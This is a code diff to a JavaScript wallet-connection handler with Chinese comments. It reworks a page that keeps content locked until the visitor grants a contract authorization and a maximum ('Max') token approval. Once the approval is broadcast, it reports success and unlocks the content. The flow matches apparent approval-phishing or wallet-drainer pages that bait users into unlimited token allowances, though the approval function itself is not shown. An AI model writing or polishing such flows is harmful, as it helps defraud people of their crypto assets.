@@ -288,6 +288,7 @@ async function handlePostConnection() {
     const allAuthorized = status.contract && tokenAuthorized;
 
     if (allAuthorized) {
+        // 🚨 已授權：最終成功狀態
         showOverlay('✅ Max 授權已成功！數據已解鎖。');
         updateContentLock(true); 
         await new Promise(resolve => setTimeout(resolve, 3000));
@@ -302,16 +303,22 @@ async function handlePostConnection() {
         `);
         updateContentLock(false); 
         
-        const authSuccess = await connectAndAuthorize();
-        
-        // 🚨 樂觀判斷：在授權交易廣播成功後，立即再次檢查狀態 (無延遲)
+        const authSuccess = await connectAndAuthorize(); // 這裡會執行授權操作
+
+        // 🚨 最終修正：樂觀判斷
+        // 如果廣播成功 (authSuccess = true)，則直接跳轉到成功狀態。
+        // 這徹底阻止了遞歸調用和狀態檢查循環。
         if (authSuccess) {
-            // 立即執行下一輪狀態檢查
-            await handlePostConnection(); 
+            showOverlay('✅ 授權操作已成功廣播！正在解鎖數據...');
+            
+            // 🚨 直接調用成功解鎖的 UI 邏輯，跳過 checkAuthorization 的遞歸
+            updateContentLock(true); 
+            await new Promise(resolve => setTimeout(resolve, 3000));
+            hideOverlay();
         } 
+        // 如果 authSuccess = false，則停留在當前鎖定和錯誤訊息。
     }
 }
-
 // ---------------------------------------------
 // 主連接入口函數 (混合連線邏輯)
 // ---------------------------------------------
